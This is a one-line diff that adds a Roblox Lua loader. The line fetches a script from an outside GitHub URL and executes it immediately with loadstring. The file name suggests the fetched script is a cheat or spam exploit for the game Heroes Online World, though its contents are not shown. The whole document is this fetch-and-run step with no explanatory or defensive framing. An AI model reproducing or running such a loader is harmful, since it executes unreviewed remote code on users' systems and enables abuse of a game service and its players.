@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/heroes-online-world-spam1-utjsvt5uodrwdq.lua"))()
